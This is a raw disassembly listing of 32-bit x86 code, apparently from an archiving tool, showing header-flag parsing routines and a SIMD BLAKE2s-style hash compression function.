  40342c:	75 03                	jne    0x403431
  40342e:	83 21 00             	andl   $0x0,(%ecx)
  403431:	8b 4e 08             	mov    0x8(%esi),%ecx
  403434:	8b c1                	mov    %ecx,%eax
  403436:	c1 e8 03             	shr    $0x3,%eax
  403439:	24 01                	and    $0x1,%al
  40343b:	88 86 88 10 00 00    	mov    %al,0x1088(%esi)
  403441:	8b c1                	mov    %ecx,%eax
  403443:	c1 e8 04             	shr    $0x4,%eax
  403446:	c1 e9 05             	shr    $0x5,%ecx
  403449:	24 01                	and    $0x1,%al
  40344b:	80 e1 01             	and    $0x1,%cl
  40344e:	80 7d 53 00          	cmpb   $0x0,0x53(%ebp)
  403452:	88 86 89 10 00 00    	mov    %al,0x1089(%esi)
  403458:	88 8e ea 10 00 00    	mov    %cl,0x10ea(%esi)
  40345e:	74 0b                	je     0x40346b
  403460:	f6 45 4c 40          	testb  $0x40,0x4c(%ebp)
  403464:	74 05                	je     0x40346b
  403466:	33 c9                	xor    %ecx,%ecx
  403468:	41                   	inc    %ecx
  403469:	eb 02                	jmp    0x40346d
  40346b:	33 c9                	xor    %ecx,%ecx
  40346d:	8a 96 84 10 00 00    	mov    0x1084(%esi),%dl
  403473:	88 8e e0 10 00 00    	mov    %cl,0x10e0(%esi)
  403479:	8b 4d 4c             	mov    0x4c(%ebp),%ecx
  40347c:	c1 e9 0a             	shr    $0xa,%ecx
  40347f:	83 e1 0f             	and    $0xf,%ecx
  403482:	80 e2 01             	and    $0x1,%dl
  403485:	b8 00 00 02 00       	mov    $0x20000,%eax
  40348a:	d3 e0                	shl    %cl,%eax
  40348c:	0f b6 ca             	movzbl %dl,%ecx
  40348f:	f7 d9                	neg    %ecx
  403491:	1b c9                	sbb    %ecx,%ecx
  403493:	f7 d1                	not    %ecx
  403495:	23 c8                	and    %eax,%ecx
  403497:	0f b6 86 8b 10 00 00 	movzbl 0x108b(%esi),%eax
  40349e:	f7 d8                	neg    %eax
  4034a0:	1b c0                	sbb    %eax,%eax
  4034a2:	89 8e e4 10 00 00    	mov    %ecx,0x10e4(%esi)
  4034a8:	83 e0 05             	and    $0x5,%eax
  4034ab:	b9 ff 1f 00 00       	mov    $0x1fff,%ecx
  4034b0:	88 96 e1 10 00 00    	mov    %dl,0x10e1(%esi)
  4034b6:	89 86 8c 10 00 00    	mov    %eax,0x108c(%esi)
  4034bc:	3b f9                	cmp    %ecx,%edi
  4034be:	72 02                	jb     0x4034c2
  4034c0:	8b f9                	mov    %ecx,%edi
  4034c2:	57                   	push   %edi
  4034c3:	8d 85 84 df ff ff    	lea    -0x207c(%ebp),%eax
  4034c9:	50                   	push   %eax
  4034ca:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4034cd:	e8 d3 7e 00 00       	call   0x40b3a5
  4034d2:	c6 84 3d 84 df ff ff 	movb   $0x0,-0x207c(%ebp,%edi,1)
  4034d9:	00 
  4034da:	68 00 08 00 00       	push   $0x800
  4034df:	8d 7e 20             	lea    0x20(%esi),%edi
  4034e2:	57                   	push   %edi
  4034e3:	8d 85 84 df ff ff    	lea    -0x207c(%ebp),%eax
  4034e9:	50                   	push   %eax
  4034ea:	e8 68 e3 00 00       	call   0x411857
  4034ef:	8b 45 18             	mov    0x18(%ebp),%eax
  4034f2:	0b 45 1c             	or     0x1c(%ebp),%eax
  4034f5:	74 0f                	je     0x403506
  4034f7:	56                   	push   %esi
  4034f8:	ff 75 18             	push   0x18(%ebp)
  4034fb:	8d 45 28             	lea    0x28(%ebp),%eax
  4034fe:	50                   	push   %eax
  4034ff:	8b cb                	mov    %ebx,%ecx
  403501:	e8 2c f2 ff ff       	call   0x402732
  403506:	80 7d 53 00          	cmpb   $0x0,0x53(%ebp)
  40350a:	74 0a                	je     0x403516
  40350c:	56                   	push   %esi
  40350d:	8b cb                	mov    %ebx,%ecx
  40350f:	e8 99 e5 ff ff       	call   0x401aad
  403514:	eb 18                	jmp    0x40352e
  403516:	68 7c a4 42 00       	push   $0x42a47c
  40351b:	57                   	push   %edi
  40351c:	e8 80 70 01 00       	call   0x41a5a1
  403521:	59                   	pop    %ecx
  403522:	59                   	pop    %ecx
  403523:	85 c0                	test   %eax,%eax
  403525:	75 07                	jne    0x40352e
  403527:	c6 83 56 b0 00 00 01 	movb   $0x1,0xb056(%ebx)
  40352e:	80 7d 4b 00          	cmpb   $0x0,0x4b(%ebp)
  403532:	0f 84 c5 00 00 00    	je     0x4035fd
  403538:	57                   	push   %edi
  403539:	8d 43 1e             	lea    0x1e(%ebx),%eax
  40353c:	50                   	push   %eax
  40353d:	6a 1a                	push   $0x1a
  40353f:	e8 b9 2d 00 00       	call   0x4062fd
  403544:	e9 b4 00 00 00       	jmp    0x4035fd
  403549:	8d bb 70 65 00 00    	lea    0x6570(%ebx),%edi
  40354f:	8b cf                	mov    %edi,%ecx
  403551:	e8 4b 63 00 00       	call   0x4098a1
  403556:	6a 05                	push   $0x5
  403558:	59                   	pop    %ecx
  403559:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40355b:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40355e:	e8 b9 7d 00 00       	call   0x40b31c
  403563:	8a c8                	mov    %al,%cl
  403565:	80 e1 01             	and    $0x1,%cl
  403568:	88 8b 55 b0 00 00    	mov    %cl,0xb055(%ebx)
  40356e:	8b c8                	mov    %eax,%ecx
  403570:	c1 e9 02             	shr    $0x2,%ecx
  403573:	80 e1 01             	and    $0x1,%cl
  403576:	88 8b 54 b0 00 00    	mov    %cl,0xb054(%ebx)
  40357c:	8b c8                	mov    %eax,%ecx
  40357e:	c1 e9 04             	shr    $0x4,%ecx
  403581:	80 e1 01             	and    $0x1,%cl
  403584:	88 8b 57 b0 00 00    	mov    %cl,0xb057(%ebx)
  40358a:	8b c8                	mov    %eax,%ecx
  40358c:	c1 e9 03             	shr    $0x3,%ecx
  40358f:	80 e1 01             	and    $0x1,%cl
  403592:	88 8b 5b b0 00 00    	mov    %cl,0xb05b(%ebx)
  403598:	c6 83 58 b0 00 00 00 	movb   $0x0,0xb058(%ebx)
  40359f:	c6 83 5a b0 00 00 01 	movb   $0x1,0xb05a(%ebx)
  4035a6:	a8 02                	test   $0x2,%al
  4035a8:	74 10                	je     0x4035ba
  4035aa:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4035ad:	e8 6a 7d 00 00       	call   0x40b31c
  4035b2:	89 83 78 b0 00 00    	mov    %eax,0xb078(%ebx)
  4035b8:	eb 07                	jmp    0x4035c1
  4035ba:	83 a3 78 b0 00 00 00 	andl   $0x0,0xb078(%ebx)
  4035c1:	80 bb 55 b0 00 00 00 	cmpb   $0x0,0xb055(%ebx)
  4035c8:	74 0e                	je     0x4035d8
  4035ca:	83 bb 78 b0 00 00 00 	cmpl   $0x0,0xb078(%ebx)
  4035d1:	75 05                	jne    0x4035d8
  4035d3:	33 c0                	xor    %eax,%eax
  4035d5:	40                   	inc    %eax
  4035d6:	eb 02                	jmp    0x4035da
  4035d8:	33 c0                	xor    %eax,%eax
  4035da:	88 83 59 b0 00 00    	mov    %al,0xb059(%ebx)
  4035e0:	8b 45 18             	mov    0x18(%ebp),%eax
  4035e3:	0b 45 1c             	or     0x1c(%ebp),%eax
  4035e6:	74 15                	je     0x4035fd
  4035e8:	8d 83 70 65 00 00    	lea    0x6570(%ebx),%eax
  4035ee:	50                   	push   %eax
  4035ef:	ff 75 18             	push   0x18(%ebp)
  4035f2:	8d 45 28             	lea    0x28(%ebp),%eax
  4035f5:	50                   	push   %eax
  4035f6:	8b cb                	mov    %ebx,%ecx
  4035f8:	e8 35 f1 ff ff       	call   0x402732
  4035fd:	8b 83 4c b0 00 00    	mov    0xb04c(%ebx),%eax
  403603:	3b 83 44 b0 00 00    	cmp    0xb044(%ebx),%eax
  403609:	7f 10                	jg     0x40361b
  40360b:	7c 24                	jl     0x403631
  40360d:	8b 83 48 b0 00 00    	mov    0xb048(%ebx),%eax
  403613:	3b 83 40 b0 00 00    	cmp    0xb040(%ebx),%eax
  403619:	76 16                	jbe    0x403631
  40361b:	83 7d 28 00          	cmpl   $0x0,0x28(%ebp)
  40361f:	8b 75 3c             	mov    0x3c(%ebp),%esi
  403622:	74 09                	je     0x40362d
  403624:	ff 75 28             	push   0x28(%ebp)
  403627:	e8 5a 6a 01 00       	call   0x41a086
  40362c:	59                   	pop    %ecx
  40362d:	8b c6                	mov    %esi,%eax
  40362f:	eb 18                	jmp    0x403649
  403631:	8b cb                	mov    %ebx,%ecx
  403633:	e8 4c e6 ff ff       	call   0x401c84
  403638:	83 7d 28 00          	cmpl   $0x0,0x28(%ebp)
  40363c:	74 09                	je     0x403647
  40363e:	ff 75 28             	push   0x28(%ebp)
  403641:	e8 40 6a 01 00       	call   0x41a086
  403646:	59                   	pop    %ecx
  403647:	33 c0                	xor    %eax,%eax
  403649:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40364c:	5f                   	pop    %edi
  40364d:	5e                   	pop    %esi
  40364e:	5b                   	pop    %ebx
  40364f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403656:	83 c5 54             	add    $0x54,%ebp
  403659:	c9                   	leave
  40365a:	c3                   	ret
  40365b:	51                   	push   %ecx
  40365c:	56                   	push   %esi
  40365d:	8b f1                	mov    %ecx,%esi
  40365f:	80 be 65 b0 00 00 00 	cmpb   $0x0,0xb065(%esi)
  403666:	75 5d                	jne    0x4036c5
  403668:	8b 06                	mov    (%esi),%eax
  40366a:	ff 50 10             	call   *0x10(%eax)
  40366d:	89 86 40 b0 00 00    	mov    %eax,0xb040(%esi)
  403673:	8b 86 50 b0 00 00    	mov    0xb050(%esi),%eax
  403679:	48                   	dec    %eax
  40367a:	48                   	dec    %eax
  40367b:	89 96 44 b0 00 00    	mov    %edx,0xb044(%esi)
  403681:	74 0c                	je     0x40368f
  403683:	48                   	dec    %eax
  403684:	75 12                	jne    0x403698
  403686:	8b ce                	mov    %esi,%ecx
  403688:	e8 5b f8 ff ff       	call   0x402ee8
  40368d:	eb 0d                	jmp    0x40369c
  40368f:	8b ce                	mov    %esi,%ecx
  403691:	e8 2f e6 ff ff       	call   0x401cc5
  403696:	eb 04                	jmp    0x40369c
  403698:	8b 44 24 04          	mov    0x4(%esp),%eax
  40369c:	85 c0                	test   %eax,%eax
  40369e:	76 27                	jbe    0x4036c7
  4036a0:	8b 8e 4c b0 00 00    	mov    0xb04c(%esi),%ecx
  4036a6:	3b 8e 44 b0 00 00    	cmp    0xb044(%esi),%ecx
  4036ac:	7f 19                	jg     0x4036c7
  4036ae:	7c 0e                	jl     0x4036be
  4036b0:	8b 8e 48 b0 00 00    	mov    0xb048(%esi),%ecx
  4036b6:	3b 8e 40 b0 00 00    	cmp    0xb040(%esi),%ecx
  4036bc:	77 09                	ja     0x4036c7
  4036be:	8b ce                	mov    %esi,%ecx
  4036c0:	e8 bf e5 ff ff       	call   0x401c84
  4036c5:	33 c0                	xor    %eax,%eax
  4036c7:	5e                   	pop    %esi
  4036c8:	59                   	pop    %ecx
  4036c9:	c3                   	ret
  4036ca:	53                   	push   %ebx
  4036cb:	55                   	push   %ebp
  4036cc:	56                   	push   %esi
  4036cd:	57                   	push   %edi
  4036ce:	8b f1                	mov    %ecx,%esi
  4036d0:	33 db                	xor    %ebx,%ebx
  4036d2:	e8 84 ff ff ff       	call   0x40365b
  4036d7:	8b f8                	mov    %eax,%edi
  4036d9:	85 ff                	test   %edi,%edi
  4036db:	74 39                	je     0x403716
  4036dd:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4036e1:	83 fd 05             	cmp    $0x5,%ebp
  4036e4:	74 09                	je     0x4036ef
  4036e6:	83 be 44 65 00 00 05 	cmpl   $0x5,0x6544(%esi)
  4036ed:	74 27                	je     0x403716
  4036ef:	43                   	inc    %ebx
  4036f0:	f6 c3 7f             	test   $0x7f,%bl
  4036f3:	75 05                	jne    0x4036fa
  4036f5:	e8 cf d2 00 00       	call   0x4109c9
  4036fa:	39 ae 44 65 00 00    	cmp    %ebp,0x6544(%esi)
  403700:	74 1d                	je     0x40371f
  403702:	8b ce                	mov    %esi,%ecx
  403704:	e8 b7 d9 ff ff       	call   0x4010c0
  403709:	8b ce                	mov    %esi,%ecx
  40370b:	e8 4b ff ff ff       	call   0x40365b
  403710:	8b f8                	mov    %eax,%edi
  403712:	85 ff                	test   %edi,%edi
  403714:	75 cb                	jne    0x4036e1
  403716:	33 c0                	xor    %eax,%eax
  403718:	5f                   	pop    %edi
  403719:	5e                   	pop    %esi
  40371a:	5d                   	pop    %ebp
  40371b:	5b                   	pop    %ebx
  40371c:	c2 04 00             	ret    $0x4
  40371f:	8b c7                	mov    %edi,%eax
  403721:	eb f5                	jmp    0x403718
  403723:	56                   	push   %esi
  403724:	57                   	push   %edi
  403725:	8b f1                	mov    %ecx,%esi
  403727:	eb 2c                	jmp    0x403755
  403729:	8b 86 44 65 00 00    	mov    0x6544(%esi),%eax
  40372f:	83 f8 05             	cmp    $0x5,%eax
  403732:	74 2c                	je     0x403760
  403734:	83 f8 03             	cmp    $0x3,%eax
  403737:	75 13                	jne    0x40374c
  403739:	ff 74 24 0c          	push   0xc(%esp)
  40373d:	8d 8e 28 89 00 00    	lea    0x8928(%esi),%ecx
  403743:	e8 4f e4 ff ff       	call   0x401b97
  403748:	84 c0                	test   %al,%al
  40374a:	75 1b                	jne    0x403767
  40374c:	8b ce                	mov    %esi,%ecx
  40374e:	e8 6d d9 ff ff       	call   0x4010c0
  403753:	8b ce                	mov    %esi,%ecx
  403755:	e8 01 ff ff ff       	call   0x40365b
  40375a:	8b f8                	mov    %eax,%edi
  40375c:	85 ff                	test   %edi,%edi
  40375e:	75 c9                	jne    0x403729
  403760:	33 c0                	xor    %eax,%eax
  403762:	5f                   	pop    %edi
  403763:	5e                   	pop    %esi
  403764:	c2 04 00             	ret    $0x4
  403767:	8b c7                	mov    %edi,%eax
  403769:	eb f7                	jmp    0x403762
  40376b:	56                   	push   %esi
  40376c:	b8 67 e6 09 6a       	mov    $0x6a09e667,%eax
  403771:	b9 85 ae 67 bb       	mov    $0xbb67ae85,%ecx
  403776:	ba 72 f3 6e 3c       	mov    $0x3c6ef372,%edx
  40377b:	be 3a f5 4f a5       	mov    $0xa54ff53a,%esi
  403780:	66 0f 6e c6          	movd   %esi,%xmm0
  403784:	66 0f 6e ca          	movd   %edx,%xmm1
  403788:	66 0f 6e d1          	movd   %ecx,%xmm2
  40378c:	66 0f 6e d8          	movd   %eax,%xmm3
  403790:	be 19 cd e0 5b       	mov    $0x5be0cd19,%esi
  403795:	b8 7f 52 0e 51       	mov    $0x510e527f,%eax
  40379a:	b9 8c 68 05 9b       	mov    $0x9b05688c,%ecx
  40379f:	ba ab d9 83 1f       	mov    $0x1f83d9ab,%edx
  4037a4:	66 0f 62 d0          	punpckldq %xmm0,%xmm2
  4037a8:	66 0f 62 d9          	punpckldq %xmm1,%xmm3
  4037ac:	66 0f 62 da          	punpckldq %xmm2,%xmm3
  4037b0:	66 0f 7f 1d 90 05 43 	movdqa %xmm3,0x430590
  4037b7:	00 
  4037b8:	66 0f 6e c6          	movd   %esi,%xmm0
  4037bc:	66 0f 6e ca          	movd   %edx,%xmm1
  4037c0:	66 0f 6e d1          	movd   %ecx,%xmm2
  4037c4:	66 0f 6e d8          	movd   %eax,%xmm3
  4037c8:	5e                   	pop    %esi
  4037c9:	66 0f 62 d0          	punpckldq %xmm0,%xmm2
  4037cd:	66 0f 62 d9          	punpckldq %xmm1,%xmm3
  4037d1:	66 0f 62 da          	punpckldq %xmm2,%xmm3
  4037d5:	66 0f 7f 1d 80 05 43 	movdqa %xmm3,0x430580
  4037dc:	00 
  4037dd:	c3                   	ret
  4037de:	55                   	push   %ebp
  4037df:	8b ec                	mov    %esp,%ebp
  4037e1:	83 e4 f0             	and    $0xfffffff0,%esp
  4037e4:	83 ec 54             	sub    $0x54,%esp
  4037e7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4037ea:	8b 55 08             	mov    0x8(%ebp),%edx
  4037ed:	8b 8a f4 00 00 00    	mov    0xf4(%edx),%ecx
  4037f3:	66 0f 6f 61 10       	movdqa 0x10(%ecx),%xmm4
  4037f8:	66 0f 6f 01          	movdqa (%ecx),%xmm0
  4037fc:	8b 8a f8 00 00 00    	mov    0xf8(%edx),%ecx
  403802:	66 0f 6f 11          	movdqa (%ecx),%xmm2
  403806:	66 0f 6f 0d 80 05 43 	movdqa 0x430580,%xmm1
  40380d:	00 
  40380e:	8b 48 18             	mov    0x18(%eax),%ecx
  403811:	8b 50 10             	mov    0x10(%eax),%edx
  403814:	53                   	push   %ebx
  403815:	8b 58 1c             	mov    0x1c(%eax),%ebx
  403818:	66 0f ef ca          	pxor   %xmm2,%xmm1
  40381c:	56                   	push   %esi
  40381d:	8b 70 08             	mov    0x8(%eax),%esi
  403820:	57                   	push   %edi
  403821:	8b 38                	mov    (%eax),%edi
  403823:	66 0f 6e d1          	movd   %ecx,%xmm2
  403827:	66 0f 6e da          	movd   %edx,%xmm3
  40382b:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40382f:	8b 58 14             	mov    0x14(%eax),%ebx
  403832:	66 0f 6e ee          	movd   %esi,%xmm5
  403836:	66 0f 6e f7          	movd   %edi,%xmm6
  40383a:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  40383e:	8b 58 0c             	mov    0xc(%eax),%ebx
  403841:	66 0f 7f 44 24 40    	movdqa %xmm0,0x40(%esp)
  403847:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  40384b:	8b 58 04             	mov    0x4(%eax),%ebx
  40384e:	66 0f 62 ea          	punpckldq %xmm2,%xmm5
  403852:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403856:	66 0f 62 f5          	punpckldq %xmm5,%xmm6
  40385a:	66 0f fe c6          	paddd  %xmm6,%xmm0
  40385e:	66 0f fe c4          	paddd  %xmm4,%xmm0
  403862:	66 0f ef c8          	pxor   %xmm0,%xmm1
  403866:	66 0f 6f d1          	movdqa %xmm1,%xmm2
  40386a:	66 0f 72 f1 10       	pslld  $0x10,%xmm1
  40386f:	66 0f 72 d2 10       	psrld  $0x10,%xmm2
  403874:	66 0f ef d1          	pxor   %xmm1,%xmm2
  403878:	66 0f 6f 0d 90 05 43 	movdqa 0x430590,%xmm1
  40387f:	00 
  403880:	66 0f 7f 64 24 50    	movdqa %xmm4,0x50(%esp)
  403886:	66 0f fe ca          	paddd  %xmm2,%xmm1
  40388a:	66 0f ef e1          	pxor   %xmm1,%xmm4
  40388e:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403892:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403896:	66 0f 6f dc          	movdqa %xmm4,%xmm3
  40389a:	66 0f 72 f4 14       	pslld  $0x14,%xmm4
  40389f:	66 0f 72 d3 0c       	psrld  $0xc,%xmm3
  4038a4:	66 0f ef dc          	pxor   %xmm4,%xmm3
  4038a8:	66 0f 6e e3          	movd   %ebx,%xmm4
  4038ac:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4038b0:	66 0f 6e eb          	movd   %ebx,%xmm5
  4038b4:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4038b8:	66 0f 6e f3          	movd   %ebx,%xmm6
  4038bc:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4038c0:	66 0f 6e fb          	movd   %ebx,%xmm7
  4038c4:	8b 58 38             	mov    0x38(%eax),%ebx
  4038c7:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  4038cb:	8b 58 30             	mov    0x30(%eax),%ebx
  4038ce:	66 0f 62 f4          	punpckldq %xmm4,%xmm6
  4038d2:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  4038d6:	8b 58 28             	mov    0x28(%eax),%ebx
  4038d9:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4038dd:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4038e1:	66 0f fe c7          	paddd  %xmm7,%xmm0
  4038e5:	66 0f fe c3          	paddd  %xmm3,%xmm0
  4038e9:	66 0f ef d0          	pxor   %xmm0,%xmm2
  4038ed:	66 0f 6f e2          	movdqa %xmm2,%xmm4
  4038f1:	66 0f 72 f2 18       	pslld  $0x18,%xmm2
  4038f6:	66 0f 72 d4 08       	psrld  $0x8,%xmm4
  4038fb:	66 0f ef e2          	pxor   %xmm2,%xmm4
  4038ff:	66 0f fe cc          	paddd  %xmm4,%xmm1
  403903:	66 0f ef d9          	pxor   %xmm1,%xmm3
  403907:	66 0f 6f eb          	movdqa %xmm3,%xmm5
  40390b:	66 0f 72 f3 19       	pslld  $0x19,%xmm3
  403910:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403915:	66 0f ef eb          	pxor   %xmm3,%xmm5
  403919:	66 0f 70 d9 4e       	pshufd $0x4e,%xmm1,%xmm3
  40391e:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  403922:	8b 58 20             	mov    0x20(%eax),%ebx
  403925:	66 0f 70 d4 93       	pshufd $0x93,%xmm4,%xmm2
  40392a:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  40392f:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403933:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  403937:	66 0f 6e e3          	movd   %ebx,%xmm4
  40393b:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  40393f:	66 0f 6e eb          	movd   %ebx,%xmm5
  403943:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  403947:	66 0f 6e f3          	movd   %ebx,%xmm6
  40394b:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40394f:	66 0f 6e fb          	movd   %ebx,%xmm7
  403953:	8b 58 3c             	mov    0x3c(%eax),%ebx
  403956:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  40395a:	8b 58 34             	mov    0x34(%eax),%ebx
  40395d:	66 0f 62 f4          	punpckldq %xmm4,%xmm6
  403961:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403965:	8b 58 2c             	mov    0x2c(%eax),%ebx
  403968:	8b 40 24             	mov    0x24(%eax),%eax
  40396b:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  40396f:	66 0f 6e 6c 24 20    	movd   0x20(%esp),%xmm5
  403975:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403979:	66 0f fe c7          	paddd  %xmm7,%xmm0
  40397d:	66 0f fe c1          	paddd  %xmm1,%xmm0
  403981:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  403985:	66 0f ef d4          	pxor   %xmm4,%xmm2
  403989:	66 0f 6f c2          	movdqa %xmm2,%xmm0
  40398d:	66 0f 72 f2 10       	pslld  $0x10,%xmm2
  403992:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403997:	66 0f ef c2          	pxor   %xmm2,%xmm0
  40399b:	66 0f fe d8          	paddd  %xmm0,%xmm3
  40399f:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4039a3:	66 0f 6f d1          	movdqa %xmm1,%xmm2
  4039a7:	66 0f 72 f2 14       	pslld  $0x14,%xmm2
  4039ac:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  4039b1:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4039b5:	89 44 24 28          	mov    %eax,0x28(%esp)
  4039b9:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4039bd:	66 0f 6e f3          	movd   %ebx,%xmm6
  4039c1:	89 5c 24 34          	mov    %ebx,0x34(%esp)
  4039c5:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4039c9:	66 0f 6e fb          	movd   %ebx,%xmm7
  4039cd:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4039d1:	66 0f 6e d0          	movd   %eax,%xmm2
  4039d5:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4039d9:	66 0f 62 f2          	punpckldq %xmm2,%xmm6
  4039dd:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4039e1:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4039e5:	66 0f 6e 7c 24 30    	movd   0x30(%esp),%xmm7
  4039eb:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4039ef:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4039f3:	66 0f 6f d0          	movdqa %xmm0,%xmm2
  4039f7:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  4039fc:	66 0f 72 d2 08       	psrld  $0x8,%xmm2
  403a01:	66 0f ef d0          	pxor   %xmm0,%xmm2
  403a05:	66 0f fe da          	paddd  %xmm2,%xmm3
  403a09:	66 0f ef cb          	pxor   %xmm3,%xmm1
  403a0d:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403a11:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403a16:	66 0f 70 c2 39       	pshufd $0x39,%xmm2,%xmm0
  403a1b:	66 0f 70 d3 4e       	pshufd $0x4e,%xmm3,%xmm2
  403a20:	66 0f 6e db          	movd   %ebx,%xmm3
  403a24:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  403a28:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403a2d:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403a31:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  403a36:	66 0f 6e eb          	movd   %ebx,%xmm5
  403a3a:	66 0f 6e f2          	movd   %edx,%xmm6
  403a3e:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403a42:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403a46:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403a4a:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403a4e:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403a52:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403a56:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403a5a:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403a5f:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403a64:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403a68:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403a6c:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403a70:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403a74:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  403a79:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  403a7e:	66 0f ef cb          	pxor   %xmm3,%xmm1
  403a82:	66 0f 6e 74 24 18    	movd   0x18(%esp),%xmm6
  403a88:	66 0f 6e 7c 24 38    	movd   0x38(%esp),%xmm7
  403a8e:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  403a92:	66 0f 6e d9          	movd   %ecx,%xmm3
  403a96:	66 0f 6e e8          	movd   %eax,%xmm5
  403a9a:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403a9e:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403aa2:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403aa6:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403aaa:	66 0f 6e 7c 24 10    	movd   0x10(%esp),%xmm7
  403ab0:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403ab4:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403ab8:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403abc:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  403ac1:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  403ac6:	66 0f ef d8          	pxor   %xmm0,%xmm3
  403aca:	66 0f fe d3          	paddd  %xmm3,%xmm2
  403ace:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403ad2:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403ad6:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  403adb:	66 0f 6e 5c 24 1c    	movd   0x1c(%esp),%xmm3
  403ae1:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403ae6:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403aeb:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403aef:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  403af4:	66 0f 6e eb          	movd   %ebx,%xmm5
  403af8:	66 0f 6e f7          	movd   %edi,%xmm6
  403afc:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403b00:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  403b05:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403b09:	66 0f 6e 6c 24 14    	movd   0x14(%esp),%xmm5
  403b0f:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403b13:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403b17:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403b1b:	66 0f 6e 7c 24 2c    	movd   0x2c(%esp),%xmm7
  403b21:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403b25:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403b29:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403b2d:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403b32:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403b37:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403b3b:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403b3f:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403b43:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403b47:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  403b4c:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  403b51:	66 0f ef cb          	pxor   %xmm3,%xmm1
